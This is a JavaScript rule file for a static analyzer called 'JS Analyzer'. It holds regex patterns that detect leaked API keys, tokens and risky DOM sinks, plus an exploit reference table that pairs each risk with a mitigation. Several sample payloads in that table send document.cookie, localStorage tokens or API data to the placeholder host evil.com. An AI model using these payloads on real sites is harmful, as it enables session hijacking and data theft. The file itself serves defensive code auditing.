// src/patterns.js — Centralized rule definitions for JS Analyzer
(function () {
  'use strict';
  window.JSA = window.JSA || {};

  JSA.SEVERITY_ORDER = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
  JSA.SEVERITY_COLORS = {
    critical: '#ef4444', high: '#f97316', medium: '#f59e0b', low: '#3b82f6', info: '#6b7280'
  };

  // Every entry is a detection rule.
  // `resultCategory` controls which result tab findings go to (defaults to key name).
  JSA.PATTERNS = {

    // ─── URLs & Endpoints (split into full-urls vs endpoints in analyzeFileContent) ───
    urls: {
      regex: /(?:https?:\/\/|wss?:\/\/|ftp:\/\/)(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|[a-zA-Z0-9.\-]+(?:\.[a-zA-Z]{2,})+)(?::\d{1,5})?(?:\/[^\s"'<>`]*)*|(["'])(\/[a-zA-Z0-9\-_~.\/%]+)\1/gi,
      label: 'Endpoint/URL',
      severity: 'info',
      confidence: 'high',
      enabled: true
    },
    linkfinder: {
      regex: /(?:"|')(((?:[a-zA-Z]{1,10}:\/\/|\/\/)[^"'/]{1,}\.[a-zA-Z]{2,}[^"']{0,})|((?:\/|\.\.\/|\.\/)[^"'><,;| *()(%%$^/\\\[\]][^"'><,;|()]{1,})|([a-zA-Z0-9_\-\/]{1,}\/[a-zA-Z0-9_\-\/]{1,}\.(?:[a-zA-Z]{1,4}|action)(?:[\?|#][^"|']{0,}|))|([a-zA-Z0-9_\-\/]{1,}\/[a-zA-Z0-9_\-\/]{3,}(?:[\?|#][^"|']{0,}|))|([a-zA-Z0-9_\-]{1,}\.(?:php|asp|aspx|jsp|json|action|html|js|txt|xml)(?:[\?|#][^"|']{0,}|)))(?:"|')/gi,
      label: 'LinkFinder Endpoint',
      severity: 'info',
      confidence: 'high',
      enabled: true
    },

    // ─── IPv4 ───
    ipv4: {
      regex: /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g,
      label: 'IPv4 Address',
      resultCategory: 'ips',
      severity: 'medium',
      confidence: 'high',
      enabled: true
    },

    // ─── Emails ───
    emails: {
      regex: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g,
      label: 'Email Address',
      severity: 'low',
      confidence: 'high',
      enabled: true
    },

    // ─── SECRET DETECTION (individual rules for granular labels) ───
    'aws-access-key': {
      regex: /(?:^|[^A-Za-z0-9])AKIA[0-9A-Z]{16}(?:[^A-Za-z0-9]|$)/g,
      label: 'AWS Access Key',
      resultCategory: 'secrets',
      severity: 'critical',
      confidence: 'high',
      enabled: true
    },
    'google-api-key': {
      regex: /\bAIza[0-9A-Za-z\-_]{35}\b/g,
      label: 'Google API Key',
      resultCategory: 'secrets',
      severity: 'critical',
      confidence: 'high',
      enabled: true
    },
    'github-token': {
      regex: /\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}\b/g,
      label: 'GitHub Token',
      resultCategory: 'secrets',
      severity: 'critical',
      confidence: 'high',
      enabled: true
    },
    'slack-token': {
      regex: /\bxox[bposa]-[0-9a-zA-Z\-]{10,}\b/g,
      label: 'Slack Token',
      resultCategory: 'secrets',
      severity: 'critical',
      confidence: 'high',
      enabled: true
    },
    'stripe-key': {
      regex: /\b(?:sk|pk|rk)_(?:live|test)_[0-9a-zA-Z]{10,}\b/g,
      label: 'Stripe Key',
      resultCategory: 'secrets',
      severity: 'critical',
      confidence: 'high',
      enabled: true
    },
    'jwt-token': {
      regex: /\beyJ[A-Za-z0-9\-_]{10,}\.eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_.+\/=]{10,}/g,
      label: 'JWT Token',
      resultCategory: 'secrets',
      severity: 'high',
      confidence: 'high',
      enabled: true
    },
    'private-key': {
      regex: /-----BEGIN[\s](?:RSA[\s]|EC[\s]|DSA[\s]|OPENSSH[\s])?PRIVATE[\s]KEY-----/g,
      label: 'Private Key Block',
      resultCategory: 'secrets',
      severity: 'critical',
      confidence: 'high',
      enabled: true
    },
    'database-url': {
      regex: /\b(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|amqp|mssql):\/\/[^\s"'<>]+/gi,
      label: 'Database Connection URL',
      resultCategory: 'secrets',
      severity: 'critical',
      confidence: 'high',
      enabled: true
    },
    'generic-secret': {
      regex: /[a-zA-Z0-9_]*?(?:bearer|token|apikey|api_key|secret|password|passwd|auth_token|access_token|client_secret|app_secret|_key|crypto|encrypt|decrypt|signing|master_key|session_key)[a-zA-Z0-9_]*\s*[:=]\s*(["'])([^"'\r\n]{10,})\1/gi,
      label: 'Generic Secret/Token',
      resultCategory: 'secrets',
      severity: 'high',
      confidence: 'medium',
      enabled: true
    },
    // Detect Bearer tokens constructed via .concat() or template literals
    'bearer-concat': {
      regex: /["']Bearer\s*["']\s*\.?\s*(?:concat|[+])\s*\(\s*["']([a-f0-9]{32,})["']\s*\)|["']Bearer\s+([a-zA-Z0-9._\-]{20,})["']/gi,
      label: 'Hardcoded Bearer Token',
      resultCategory: 'secrets',
      severity: 'critical',
      confidence: 'high',
      enabled: true
    },
    // Detect Authorization headers with hardcoded values
    'authorization-header': {
      regex: /[Aa]uthorization\s*[:=]\s*["'`](?:Bearer|Basic|Token)\s+[a-zA-Z0-9._+\/\-]{20,}["'`]|[Aa]uthorization\s*[:=]\s*["'`](?:Bearer|Basic|Token)\s*["'`]\s*\.?\s*(?:concat|[+])\s*\(\s*["'`]([a-zA-Z0-9._+\/\-]{20,})["'`]/gi,
      label: 'Hardcoded Authorization Header',
      resultCategory: 'secrets',
      severity: 'critical',
      confidence: 'high',
      enabled: true
    },
    // Detect long hex strings (64+ chars) that look like API keys/tokens
    'long-hex-token': {
      regex: /["']([a-f0-9]{64,})["']/gi,
      label: 'Long Hex Token',
      resultCategory: 'secrets',
      severity: 'high',
      confidence: 'medium',
      enabled: true
    },

    // ─── VULNERABILITY / DANGEROUS PATTERN DETECTION ───
    'dom-sinks': {
      regex: /(innerHTML|outerHTML|document\.write|document\.writeln|eval|setTimeout|setInterval|Function)\s*\(/gi,
      label: 'DOM Sink (XSS Risk)',
      resultCategory: 'vulnerabilities',
      severity: 'high',
      confidence: 'high',
      enabled: true,
      hasExploitInfo: true
    },
    'inner-html-assign': {
      regex: /\.innerHTML\s*[+]?=/gi,
      label: 'innerHTML Assignment',
      resultCategory: 'vulnerabilities',
      severity: 'high',
      confidence: 'high',
      enabled: true,
      hasExploitInfo: true,
      exploitKey: 'innerhtml'
    },
    'postmessage': {
      regex: /\.postMessage\s*\(|addEventListener\s*\(\s*["']message["']/gi,
      label: 'postMessage Usage',
      resultCategory: 'vulnerabilities',
      severity: 'medium',
      confidence: 'high',
      enabled: true,
      hasExploitInfo: true
    },
    'prototype-pollution': {
      regex: /__proto__\s*[\[.]|\.constructor\s*\[|prototype\s*\[/gi,
      label: 'Prototype Pollution Risk',
      resultCategory: 'vulnerabilities',
      severity: 'high',
      confidence: 'medium',
      enabled: true,
      hasExploitInfo: true,
      exploitKey: '__proto__'
    },
    'react-dangerous': {
      regex: /dangerouslySetInnerHTML/gi,
      label: 'React dangerouslySetInnerHTML',
      resultCategory: 'vulnerabilities',
      severity: 'high',
      confidence: 'high',
      enabled: true,
      hasExploitInfo: true,
      exploitKey: 'dangerouslysetinnerhtml'
    },
    'angular-bypass': {
      regex: /bypassSecurityTrust\w+/gi,
      label: 'Angular Security Bypass',
      resultCategory: 'vulnerabilities',
      severity: 'high',
      confidence: 'high',
      enabled: true,
      hasExploitInfo: true,
      exploitKey: 'bypasssecuritytrust'
    },

    // ─── CLIENT STORAGE ACCESS ───
    'storage-access': {
      regex: /(?:localStorage|sessionStorage)\s*\.\s*(?:getItem|setItem|removeItem|clear)\s*\(|(?:localStorage|sessionStorage)\s*\[/gi,
      label: 'Client Storage Access',
      resultCategory: 'storage',
      severity: 'medium',
      confidence: 'high',
      enabled: true,
      hasExploitInfo: true,
      exploitKey: 'localstorage'
    },
    'cookie-access': {
      regex: /document\.cookie\s*[=]/gi,
      label: 'Cookie Manipulation',
      resultCategory: 'storage',
      severity: 'medium',
      confidence: 'high',
      enabled: true,
      hasExploitInfo: true,
      exploitKey: 'document.cookie'
    },

    // ─── SENSITIVE FILE REFERENCES ───
    'sensitive-files': {
      regex: /["'][^"'\s]{1,100}\.(?:env|bak|sql|csv|log|conf|ya?ml|xml|pem|key|cert|crt|old|orig|backup|dump|db|sqlite|htpasswd|htaccess|DS_Store|npmrc)['"]/gi,
      label: 'Sensitive File Reference',
      resultCategory: 'files',
      severity: 'medium',
      confidence: 'medium',
      enabled: true
    },
    'internal-paths': {
      regex: /["'](?:\/etc\/(?:passwd|shadow|hosts|nginx)|\/var\/(?:log|www|tmp)|\/proc\/|\/root\/|C:\\\\(?:Windows|Users|Program))[^"']*["']/gi,
      label: 'Internal Path Reference',
      resultCategory: 'files',
      severity: 'high',
      confidence: 'medium',
      enabled: true
    },

    // ─── FRAMEWORK / LIBRARY DETECTION ───
    // Now handled natively by vuln-scanner.js (provides version + CVE data)
    'source-maps': {
      regex: /\/\/#\s*sourceMappingURL=\S+/gi,
      label: 'Source Map Reference',
      resultCategory: 'files',
      severity: 'medium',
      confidence: 'high',
      enabled: true
    },

    // ─── THIRD-PARTY INTEGRATIONS ───
    integrations: {
      regex: /(?:stripe\.com|firebaseio\.com|firebase\.google\.com|amazonaws\.com|mixpanel\.com|datadoghq\.com|sentry\.io|algolia\.net|segment\.(?:com|io)|intercom\.io|zendesk\.com|twilio\.com|sendgrid\.net|mailgun\.(?:net|com)|cloudinary\.com|pusher\.com|pubnub\.com|launchdarkly\.com|supabase\.(?:co|io)|auth0\.com|okta\.com|clerk\.dev)/gi,
      label: 'Third-Party Service',
      severity: 'info',
      confidence: 'high',
      enabled: true
    },

    // ─── CLOUD STORAGE URLS ───
    'cloud-storage': {
      regex: /(?:[a-zA-Z0-9\-_.]+\.s3[.\-](?:us|eu|ap|sa|ca|me|af|cn)?[a-z0-9\-]*\.?amazonaws\.com|s3\.amazonaws\.com\/[a-zA-Z0-9\-_.]+|storage\.googleapis\.com\/[a-zA-Z0-9\-_.]+|[a-zA-Z0-9\-_.]+\.storage\.googleapis\.com|[a-zA-Z0-9\-_.]+\.blob\.core\.windows\.net)/gi,
      label: 'Cloud Storage URL',
      resultCategory: 'full-urls',
      severity: 'medium',
      confidence: 'high',
      enabled: true,
      hasExploitInfo: true,
      exploitKey: 'cloudstorage'
    },

    // ─── OAUTH REDIRECT URI ───
    'oauth-redirect': {
      regex: /redirect[_-]?uri\s*[:=]\s*["']([^"'\s]{10,})["']/gi,
      label: 'OAuth Redirect URI',
      resultCategory: 'secrets',
      severity: 'high',
      confidence: 'medium',
      enabled: true
    },

    // ─── DEBUG / DEV MODE FLAGS ───
    'debug-flags': {
      regex: /(?:debug|devMode|debugMode|dev_mode|DEBUG_MODE|isDebug|isDev|enableDebug|debugEnabled|isProduction|NODE_ENV)\s*[:=]\s*(?:true|false|["'](?:development|staging|test)["'])/gi,
      label: 'Debug/Dev Flag',
      resultCategory: 'vulnerabilities',
      severity: 'low',
      confidence: 'medium',
      enabled: true
    },

    // ─── GRAPHQL OPERATIONS ───
    'graphql-ops': {
      regex: /(?:query|mutation|subscription)\s+[A-Z][a-zA-Z0-9_]*\s*(?:\([^)]*\))?\s*\{|\{\s*(?:__schema|__type)\s*\{/gi,
      label: 'GraphQL Operation',
      resultCategory: 'endpoints',
      severity: 'info',
      confidence: 'high',
      enabled: true
    },

    // ─── CORS MISCONFIGURATION ───
    'cors-wildcard': {
      regex: /Access-Control-Allow-Origin\s*[:=]\s*["']?\*["']?|cors\s*[:=]\s*(?:true|\{[^}]*origin\s*:\s*(?:true|\*|["']\*["']))/gi,
      label: 'CORS Wildcard/Misconfiguration',
      resultCategory: 'vulnerabilities',
      severity: 'medium',
      confidence: 'medium',
      enabled: true,
      hasExploitInfo: true,
      exploitKey: 'corswildcard'
    },

    // ─── HARDCODED PASSWORD ───
    'hardcoded-password': {
      regex: /(?:password|passwd|pwd)\s*[:=]\s*["']([^"'\r\n]{4,})["']/gi,
      label: 'Hardcoded Password',
      resultCategory: 'secrets',
      severity: 'critical',
      confidence: 'medium',
      enabled: true
    },

    // ─── WEBPACK CHUNK PATTERNS ───
    'webpack-chunks': {
      regex: /(?:__webpack_require__|webpackJsonp|__webpack_modules__)\s*[.(\[]|["'][a-zA-Z0-9./\-_]*\.chunk\.js["']/gi,
      label: 'Webpack Chunk Reference',
      resultCategory: 'files',
      severity: 'info',
      confidence: 'high',
      enabled: true
    }
  };

  // ─── EXPLOIT DATABASE ───
  JSA.EXPLOIT_DB = {
    'innerhtml': {
      risk: 'Critical',
      description: 'innerHTML parses and renders raw HTML directly into the DOM. If user-controlled data flows into it, an attacker can inject arbitrary HTML including script tags.',
      exploit: '&lt;img src=x onerror=alert(document.cookie)&gt;',
      mitigation: 'Use textContent or innerText instead. If HTML is required, sanitize input with DOMPurify before assigning to innerHTML.'
    },
    'document.write': {
      risk: 'Critical',
      description: 'document.write() injects raw strings directly into the document stream. If called after page load, it replaces the entire page.',
      exploit: '&lt;script&gt;fetch("https://evil.com/steal?"+document.cookie)&lt;/script&gt;',
      mitigation: 'Avoid document.write() entirely. Use DOM manipulation methods like createElement() and appendChild().'
    },
    'document.writeln': {
      risk: 'Critical',
      description: 'Identical to document.write() but appends a newline. Same XSS risk.',
      exploit: '&lt;script&gt;new Image().src="https://evil.com/?"+document.cookie&lt;/script&gt;',
      mitigation: 'Replace with safe DOM APIs like createElement(). Never pass user input to document.writeln().'
    },
    'eval': {
      risk: 'Critical',
      description: 'eval() executes arbitrary JavaScript code from a string. If an attacker controls any part of the string, they achieve full RCE in the browser context.',
      exploit: 'eval("fetch(\'https://evil.com/steal?c=\'+document.cookie)")',
      mitigation: 'Never use eval(). Use JSON.parse() for data parsing.'
    },
    'settimeout': {
      risk: 'High',
      description: 'When setTimeout() receives a string argument, it acts like eval() and executes the string as code.',
      exploit: 'setTimeout("alert(document.domain)", 0)',
      mitigation: 'Always pass a function reference to setTimeout(), never a string.'
    },
    'setinterval': {
      risk: 'High',
      description: 'Like setTimeout, setInterval() with a string argument evaluates it as code on every tick.',
      exploit: 'setInterval("new Image().src=\'https://evil.com/?\'+document.cookie", 5000)',
      mitigation: 'Always pass a function reference to setInterval(), never a string.'
    },
    'function': {
      risk: 'High',
      description: 'The Function constructor compiles and executes a string as code, similar to eval().',
      exploit: 'new Function("return fetch(\'https://evil.com/steal?\'+document.cookie)")()',
      mitigation: 'Avoid dynamically constructing functions from strings.'
    },
    'postmessage': {
      risk: 'Medium',
      description: 'postMessage allows cross-origin communication. Without proper origin validation, an attacker can send malicious messages.',
      exploit: 'window.postMessage({type:"config",admin:true}, "*")',
      mitigation: 'Always validate event.origin in message handlers. Never use "*" as targetOrigin.'
    },
    'localstorage': {
      risk: 'Medium',
      description: 'Storing sensitive data in localStorage makes it accessible to any XSS payload on the page.',
      exploit: 'fetch("https://evil.com/?t="+localStorage.getItem("auth_token"))',
      mitigation: 'Never store sensitive tokens or PII in localStorage. Use httpOnly cookies.'
    },
    'sessionstorage': {
      risk: 'Medium',
      description: 'Similar to localStorage but session-scoped. Still accessible to XSS.',
      exploit: 'new Image().src="https://evil.com/?d="+sessionStorage.getItem("session")',
      mitigation: 'Avoid storing sensitive data in sessionStorage. Use server-side sessions.'
    },
    'document.cookie': {
      risk: 'High',
      description: 'Direct cookie access allows reading/writing cookies. Combined with XSS, all non-httpOnly cookies can be stolen.',
      exploit: 'fetch("https://evil.com/?c="+document.cookie)',
      mitigation: 'Use httpOnly and Secure flags on cookies. Implement CSP headers.'
    },
    'dangerouslysetinnerhtml': {
      risk: 'High',
      description: 'React\'s dangerouslySetInnerHTML bypasses built-in XSS protection and injects raw HTML.',
      exploit: 'dangerouslySetInnerHTML={{__html: userInput}}',
      mitigation: 'Avoid dangerouslySetInnerHTML. Sanitize with DOMPurify if absolutely needed.'
    },
    'bypasssecuritytrust': {
      risk: 'High',
      description: 'Angular\'s bypassSecurityTrust* methods disable built-in sanitization.',
      exploit: 'this.sanitizer.bypassSecurityTrustHtml(userInput)',
      mitigation: 'Avoid using bypassSecurityTrust. Validate and sanitize all input first.'
    },
    '__proto__': {
      risk: 'High',
      description: 'Prototype pollution allows modifying Object.prototype, affecting all objects. Can lead to auth bypass or RCE.',
      exploit: 'obj.__proto__.isAdmin = true; // All objects now have isAdmin = true',
      mitigation: 'Use Object.create(null) for lookups. Validate keys. Use Map instead of plain objects.'
    },
    'cloudstorage': {
      risk: 'Medium',
      description: 'Exposed cloud storage bucket URLs can lead to data leakage if the bucket is misconfigured with public access. Attackers can enumerate or download sensitive files.',
      exploit: 'aws s3 ls s3://bucket-name --no-sign-request',
      mitigation: 'Ensure buckets are private. Use signed URLs with expiration for temporary access. Audit bucket policies regularly.'
    },
    'corswildcard': {
      risk: 'Medium',
      description: 'CORS wildcard (*) allows any website to make cross-origin requests to this API. If combined with credentials, attackers can steal user data from any origin.',
      exploit: 'fetch("https://target.com/api/user", {credentials: "include"}).then(r => r.json()).then(d => fetch("https://evil.com/steal?d="+JSON.stringify(d)))',
      mitigation: 'Never use * with credentials. Whitelist specific trusted origins. Validate the Origin header server-side.'
    }
  };

  // ─── RESULT CATEGORIES (defines tabs and their order) ───
  JSA.CATEGORIES = [
    { id: 'full-urls', label: 'Full URLs', icon: 'link' },
    { id: 'endpoints', label: 'Endpoints', icon: 'api' },
    { id: 'routes', label: 'Routes', icon: 'map' },
    { id: 'ips', label: 'IPs', icon: 'network' },
    { id: 'secrets', label: 'Secrets', icon: 'key' },
    { id: 'emails', label: 'Emails', icon: 'mail' },
    { id: 'vulnerabilities', label: 'Vulns', icon: 'alert' },
    { id: 'storage', label: 'Storage', icon: 'database' },
    { id: 'files', label: 'Files', icon: 'file' },
    { id: 'libraries', label: 'Libraries', icon: 'package' },
    { id: 'integrations', label: 'Integrations', icon: 'cloud' },
    { id: 'taint', label: 'Taint Flows', icon: 'alert' },
    { id: 'dynamic', label: 'Dynamic', icon: 'play' }
  ];

  // Helper: create empty results object
  JSA.createEmptyResults = function () {
    const r = {};
    JSA.CATEGORIES.forEach(c => r[c.id] = []);
    return r;
  };

  // Helper: create empty seen-sets object
  JSA.createEmptySeen = function () {
    const s = {};
    JSA.CATEGORIES.forEach(c => s[c.id] = new Set());
    return s;
  };

  // Load saved rule settings from localStorage
  JSA.loadSettings = function () {
    try {
      const saved = localStorage.getItem('jsa-settings');
      if (saved) {
        const settings = JSON.parse(saved);
        for (const [ruleId, enabled] of Object.entries(settings.rules || {})) {
          if (JSA.PATTERNS[ruleId]) JSA.PATTERNS[ruleId].enabled = enabled;
        }
        JSA.entropyThreshold = settings.entropyThreshold || 4.5;
      }
    } catch (e) { /* ignore */ }
  };

  // Save rule settings to localStorage
  JSA.saveSettings = function () {
    const rules = {};
    for (const [id, p] of Object.entries(JSA.PATTERNS)) {
      rules[id] = p.enabled;
    }
    localStorage.setItem('jsa-settings', JSON.stringify({
      rules,
      entropyThreshold: JSA.entropyThreshold || 4.5
    }));
  };

  JSA.entropyThreshold = 4.5;
  JSA.loadSettings();

})();
